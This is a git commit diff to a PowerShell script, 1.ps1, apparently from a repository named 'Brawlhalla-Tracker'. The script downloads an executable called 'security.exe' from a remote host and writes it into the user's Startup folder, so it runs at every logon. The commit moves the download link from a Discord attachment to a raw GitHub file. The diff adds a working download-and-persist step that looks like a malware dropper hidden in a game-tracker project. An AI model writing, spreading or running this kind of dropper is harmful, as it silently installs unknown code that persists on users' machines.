5ad9f0690ac91bbd268e5699e0a354a1932c96a2
FCsab <161705557+FCsab@users.noreply.github.com>
2025-03-03 11:24:44 +0100

    Update 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -1,5 +1,5 @@
 $startupFolder = [Environment]::GetFolderPath("Startup")
-$url = "https://cdn.discordapp.com/attachments/1342936036614869114/1345801143145463839/security.exe?ex=67c5de7c&is=67c48cfc&hm=ac97b9f34bbd2cfd3df89c0a047baf3ed294e230afc70ce9c2e04a4f0fbe9aab&"
+$url = "https://github.com/FCsab/Brawlhalla-Tracker/raw/refs/heads/main/security.exe"
 $outputPath = Join-Path $startupFolder "security.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $outputPath
